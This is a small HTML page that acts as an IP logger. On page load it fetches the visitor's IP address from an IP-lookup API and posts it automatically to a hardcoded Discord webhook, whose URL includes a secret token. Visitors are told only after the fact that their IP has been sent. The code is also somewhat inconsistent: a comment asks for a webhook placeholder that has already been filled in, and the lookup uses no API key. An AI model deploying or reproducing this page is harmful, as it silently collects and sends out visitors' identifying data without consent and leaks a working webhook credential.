<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Send My IP to Discord</title>
</head>
<body onload="sendToDiscord()">
    <h1>Thanks for visiting! Your IP has been sent to Discord.</h1>
</body>

<script src="//ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script>
function sendToDiscord() {
    $.getJSON("https://api.ipdata.co", function(data){
        // Replace WEBHOOK_URL with your Discord Webhook URL obtained from Discord API.
        var messageData = JSON.stringify({content: "The visitor's IP address is " + data.connection.client_ip});
        fetch('https://discord.com/api/webhooks/1302684161852702730/YiE1EIC9F0U5ayDfXEdhSi4H1tiNilrSysfPTpFRJ6BEZ5jdia5QwHaYbf4oSlj8zgvp', {method: 'POST', headers:{ 'Content-Type': 'application/json'}, body:messageData})
            .then(() => console.log('Sent message to Discord'))
            .catch(error => console.error('Error while sending message: ', error));
    });
}
</script>
</html>
